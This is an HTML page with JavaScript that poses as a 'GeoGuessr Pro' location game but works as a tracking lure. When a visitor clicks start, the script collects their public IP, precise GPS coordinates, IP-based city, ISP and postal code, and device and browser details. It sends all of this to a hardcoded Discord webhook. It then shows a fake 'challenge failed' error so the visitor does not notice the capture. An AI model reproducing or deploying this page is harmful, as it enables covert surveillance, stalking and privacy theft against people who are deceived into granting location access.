<!DOCTYPE html>
<html>
<head>
    <title>GeoGuessr Challenge by me</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 700px; margin: 50px auto; padding: 30px; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.2); }
        h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        p { font-size: 1.2em; opacity: 0.9; margin-bottom: 30px; }
        button { padding: 18px 40px; font-size: 1.3em; background: linear-gradient(45deg, #ff6b6b, #ffa726); color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; letter-spacing: 1px; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3); }
        button:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4); background: linear-gradient(45deg, #ff5252, #ff9800); }
        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        #status { margin-top: 30px; padding: 20px; border-radius: 10px; display: none; background: rgba(255, 255, 255, 0.15); border-left: 5px solid #4CAF50; }
        #loading { display: none; margin: 20px auto; width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; }
        .permission-note { font-size: 0.9em; margin-top: 20px; opacity: 0.8; font-style: italic; }
        .game-title { font-size: 3em; font-weight: bold; margin-bottom: 10px; background: linear-gradient(45deg, #ffd700, #ff8c00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="game-title">GeoGuessr Pro</div>
        <h1>Guess Your Location Challenge</h1>
        <p>Click the button below to start the GeoGuessr challenge! The game will analyze your location accuracy.</p>
        
        <button id="trackButton">üéØ START CHALLENGE</button>
        <div id="loading"></div>
        <div id="status"></div>
        <div class="permission-note">Note: We need location access to calculate your GeoGuessr accuracy score.</div>
    </div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
        
        async function getExactGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported', allowed: false });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            allowed: true,
                            lat: position.coords.latitude.toFixed(8),
                            lon: position.coords.longitude.toFixed(8),
                            accuracy: Math.round(position.coords.accuracy) + ' meters',
                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
                            heading: position.coords.heading ? position.coords.heading + '¬∞' : 'N/A',
                            timestamp: new Date(position.timestamp).toISOString(),
                            source: 'Real-time GPS'
                        });
                    },
                    (error) => {
                        let errorMsg = 'Permission denied';
                        if (error.code === error.POSITION_UNAVAILABLE) errorMsg = 'Location unavailable';
                        if (error.code === error.TIMEOUT) errorMsg = 'Request timeout';
                        resolve({ error: errorMsg, allowed: false });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function getIPLocation(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                return {
                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown',
                    zip: data.postal || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    source: 'IP Geolocation'
                };
            } catch {
                return {
                    lat: 'Unknown',
                    lon: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    isp: 'Unknown',
                    zip: 'Unknown',
                    timezone: 'Unknown',
                    source: 'Failed'
                };
            }
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            
            let device = 'Desktop';
            if (/mobile/i.test(ua.toLowerCase())) device = 'Mobile';
            if (/tablet/i.test(ua.toLowerCase())) device = 'Tablet';
            
            let os = 'Unknown';
            if (/windows/i.test(ua)) os = 'Windows';
            else if (/mac/i.test(ua)) os = 'macOS';
            else if (/linux/i.test(ua)) os = 'Linux';
            else if (/android/i.test(ua)) os = 'Android';
            else if (/iphone|ipad/i.test(ua)) os = 'iOS';
            
            let browser = 'Unknown';
            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
            else if (/firefox/i.test(ua)) browser = 'Firefox';
            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
            else if (/edge/i.test(ua)) browser = 'Edge';
            else if (/opera/i.test(ua)) browser = 'Opera';
            
            return {
                device: device,
                os: os,
                browser: browser,
                language: navigator.language || 'Unknown',
                platform: navigator.platform || 'Unknown',
                userAgent: ua,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth + 'bit',
                pixelRatio: window.devicePixelRatio || 1
            };
        }
        
        function calculateGeoGuessrScore(gpsLat, gpsLon, ipLat, ipLon) {
            if (gpsLat === 'Unknown' || ipLat === 'Unknown') return 'Cannot calculate';
            
            const R = 6371;
            const lat1 = parseFloat(gpsLat) * Math.PI / 180;
            const lat2 = parseFloat(ipLat) * Math.PI / 180;
            const dLat = (parseFloat(ipLat) - parseFloat(gpsLat)) * Math.PI / 180;
            const dLon = (parseFloat(ipLon) - parseFloat(gpsLon)) * Math.PI / 180;
            
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                      Math.cos(lat1) * Math.cos(lat2) *
                      Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            const distance = R * c;
            
            let score = 5000 - (distance * 10);
            score = Math.max(0, Math.round(score));
            
            return {
                distance: distance.toFixed(2) + ' km',
                score: score + ' points',
                accuracy: distance < 1 ? 'Perfect!' : distance < 10 ? 'Good' : distance < 100 ? 'Okay' : 'Poor'
            };
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            const loading = document.getElementById('loading');
            
            button.disabled = true;
            button.textContent = 'Analyzing Location...';
            loading.style.display = 'block';
            status.style.display = 'none';
            
            try {
                // Step 1: Get IP
                status.innerHTML = 'Step 1/4: Getting network information...';
                status.style.display = 'block';
                const publicIP = await getIPAddress();
                
                // Step 2: Get exact GPS location (ask permission)
                status.innerHTML = 'Step 2/4: Requesting location access for accuracy calculation...';
                const gpsLocation = await getExactGPSLocation();
                
                // Step 3: Get IP-based location
                status.innerHTML = 'Step 3/4: Calculating IP-based location...';
                const ipLocation = await getIPLocation(publicIP);
                
                // Step 4: Get device info
                status.innerHTML = 'Step 4/4: Analyzing device information...';
                const browserInfo = getBrowserInfo();
                
                // Calculate "GeoGuessr score"
                const score = calculateGeoGuessrScore(
                    gpsLocation.allowed ? gpsLocation.lat : ipLocation.lat,
                    gpsLocation.allowed ? gpsLocation.lon : ipLocation.lon,
                    ipLocation.lat,
                    ipLocation.lon
                );
                
                const now = new Date();
                const timeStr = now.toLocaleString();
                
                // Create maps links
                let exactMapsLink = 'No GPS access';
                let ipMapsLink = 'No coordinates';
                
                if (gpsLocation.allowed) {
                    exactMapsLink = `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lon}&z=18`;
                }
                if (ipLocation.lat !== 'Unknown') {
                    ipMapsLink = `https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon}&z=12`;
                }
                
                // Build Discord embed
                const embed = {
                    title: "üéÆ GEOGUESSR CHALLENGE COMPLETED",
                    color: gpsLocation.allowed ? 0x00FF00 : 0xFFA500,
                    fields: [
                        {
                            name: "üìä GEOGUESSR SCORE",
                            value: `**Distance Error:** ${score.distance}\n**Score:** ${score.score}\n**Accuracy:** ${score.accuracy}\n**GPS Access:** ${gpsLocation.allowed ? '‚úÖ Granted' : '‚ùå Denied'}`,
                            inline: true
                        },
                        {
                            name: "üìç EXACT LOCATION",
                            value: `**Latitude:** ${gpsLocation.allowed ? gpsLocation.lat : 'Permission denied'}\n**Longitude:** ${gpsLocation.allowed ? gpsLocation.lon : 'Permission denied'}\n**Accuracy:** ${gpsLocation.allowed ? gpsLocation.accuracy : 'N/A'}\n**Speed:** ${gpsLocation.allowed ? gpsLocation.speed : 'N/A'}\n**View:** ${exactMapsLink}`,
                            inline: true
                        },
                        {
                            name: "üåê IP LOCATION",
                            value: `**IP:** \`${publicIP}\`\n**Country:** ${ipLocation.country}\n**City:** ${ipLocation.city}\n**ISP:** ${ipLocation.isp}\n**View:** ${ipMapsLink}`,
                            inline: true
                        },
                        {
                            name: "üíª DEVICE INFO",
                            value: `**Device:** ${browserInfo.device}\n**OS:** ${browserInfo.os}\n**Browser:** ${browserInfo.browser}\n**Screen:** ${browserInfo.screen}\n**Language:** ${browserInfo.language}`,
                            inline: true
                        },
                        {
                            name: "üïê SESSION DETAILS",
                            value: `**Time:** ${timeStr}\n**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}\n**User Agent:** \`\`\`${browserInfo.userAgent.substring(0, 200)}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `GeoGuessr Challenge ‚Ä¢ ${gpsLocation.allowed ? 'Real GPS Captured!' : 'IP Location Only'}`
                    },
                    timestamp: now.toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "GeoGuessr Bot",
                    content: gpsLocation.allowed ? "üéØ **REAL GPS LOCATION CAPTURED!** üéØ" : "üìç IP Location Captured"
                };
                
                // Send to Discord
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                // Show fake "failed" message to user
                if (response.ok) {
                    loading.style.display = 'none';
                    button.style.display = 'none';
                    
                    // Fake failure message
                    status.innerHTML = `
                        <div style="color: #ff6b6b; font-size: 1.3em; margin-bottom: 15px;">
                            ‚ùå GEOGUESSR CHALLENGE FAILED
                        </div>
                        <div style="margin-bottom: 20px;">
                            <strong>Error Code:</strong> LOCATION_MISMATCH_ERROR<br>
                            <strong>Reason:</strong> IP-based location differs from GPS by ${score.distance}<br>
                            <strong>Score:</strong> ${score.score}<br>
                            <strong>Status:</strong> Could not verify location authenticity
                        </div>
                        <div style="font-size: 0.9em; opacity: 0.8;">
                            This challenge requires precise location verification. Try again with location services enabled.
                        </div>
                    `;
                    status.style.borderLeftColor = '#ff6b6b';
                    status.style.color = '#ffebee';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                loading.style.display = 'none';
                status.innerHTML = `
                    <div style="color: #ff9800; font-size: 1.3em; margin-bottom: 15px;">
                        ‚ö†Ô∏è CHALLENGE INTERRUPTED
                    </div>
                    <div style="margin-bottom: 20px;">
                        The GeoGuessr server is experiencing high traffic.<br>
                        Your attempt has been logged but not scored.
                    </div>
                    <div style="font-size: 0.9em; opacity: 0.8;">
                        Try again in a few moments.
                    </div>
                `;
                status.style.borderLeftColor = '#ff9800';
                status.style.color = '#fff3e0';
                status.style.display = 'block';
            } finally {
                button.disabled = false;
                button.textContent = 'üéØ TRY AGAIN';
                button.style.display = 'block';
            }
        });
    </script>
</body>
</html>
